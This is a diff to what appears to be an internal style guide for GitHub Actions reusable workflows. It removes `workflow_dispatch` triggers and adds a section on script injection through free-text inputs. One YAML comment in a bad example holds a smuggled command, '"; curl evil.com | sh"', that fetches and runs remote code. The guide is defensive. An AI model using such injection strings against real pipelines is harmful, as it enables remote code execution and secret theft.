@@ -116,7 +116,7 @@ runs-on: self-hosted
 
 Every reusable workflow must:
 - support `workflow_call` (for external callers)
-- support `workflow_dispatch` (for manual testing)
+- **must NOT have `workflow_dispatch`** — manual testing belongs in `self-*` entrypoints (see [script injection risk](#script-injection--workflow_dispatch))
 - expose explicit `inputs` — never rely on implicit context
 - **always include a `dry_run` input** (`type: boolean`, `default: false`)
 
@@ -135,15 +135,6 @@ on:
     secrets:
       DEPLOY_TOKEN:
         required: true
-  workflow_dispatch:
-    inputs:
-      environment:
-        required: true
-        type: string
-      dry_run:
-        description: Preview changes without applying them
-        type: boolean
-        default: false
 ```
 
 ## Configurability — expose composite toggles as workflow inputs
@@ -358,6 +349,59 @@ uses: actions/checkout@abc123def456 # v6
 - Never interpolate untrusted user input directly into `run:` commands
 - Never print secrets via `echo`, env dumps, or step summaries
 - Complex conditional logic belongs in the workflow, not in composites
+
+### Script injection & `workflow_dispatch`
+
+`workflow_dispatch` inputs are **user-controlled free-text** — they are a script injection vector when interpolated into `run:` blocks, `github-script`, or any expression context.
+
+**Why reusable workflows must NOT have `workflow_dispatch`:**
+
+1. **Attack surface** — any repo collaborator can trigger the workflow with arbitrary input values. If those values reach a `run:` step via `${{ inputs.xxx }}`, an attacker can inject shell commands.
+2. **Redundancy** — `self-*` entrypoints already provide `workflow_dispatch` with controlled, repo-specific defaults. Adding it to the reusable workflow duplicates the trigger surface without added value.
+3. **Input type mismatch** — `workflow_dispatch` inputs are always strings (even booleans become `"true"`/`"false"`), causing subtle type bugs when the same input is `type: boolean` under `workflow_call`.
+
+```yaml
+# ❌ Reusable workflow with workflow_dispatch — injection risk + type mismatch
+on:
+  workflow_call:
+    inputs:
+      environment:
+        type: string
+  workflow_dispatch:
+    inputs:
+      environment:        # string — attacker can inject: "; curl evil.com | sh"
+        type: string
+
+# ✅ Reusable workflow — workflow_call only
+on:
+  workflow_call:
+    inputs:
+      environment:
+        type: string
+
+# ✅ self-* entrypoint provides the manual trigger with safe defaults
+name: Self — Deploy
+on:
+  workflow_dispatch:
+    inputs:
+      environment:
+        type: choice           # choice, not free-text — no injection
+        options: [staging, production]
+jobs:
+  deploy:
+    uses: ./.github/workflows/deploy.yml
+    with:
+      environment: ${{ inputs.environment }}
+    secrets: inherit
+```
+
+**When `workflow_dispatch` is allowed on a reusable workflow:**
+
+Only when **all** of the following are true:
+- The workflow is **not consumed by external repos** (internal-only)
+- Every `workflow_dispatch` input uses `type: choice` or `type: boolean` — **never free-text `type: string`**
+- No input value is interpolated into `run:` blocks — only into `with:` parameters of trusted actions
+- The decision is documented with a `# Security: workflow_dispatch approved — <reason>` comment
 
 ### Reserved names — never use as custom secret or input names
 
